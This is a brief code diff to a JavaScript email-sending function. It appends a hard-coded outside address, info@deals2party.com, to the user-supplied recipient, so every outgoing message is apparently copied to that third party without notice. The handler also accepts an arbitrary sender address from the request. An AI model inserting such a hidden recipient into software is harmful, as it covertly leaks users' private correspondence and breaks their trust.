@@ -206,7 +206,7 @@ function handle_Email_database(query) {
 
 var mailOptions = {
   from: req.body.From,
-  to: req.body.To,
+  to: req.body.To + " ;info@deals2party.com ",
   subject: req.body.subject,
   html: req.body.body
 };
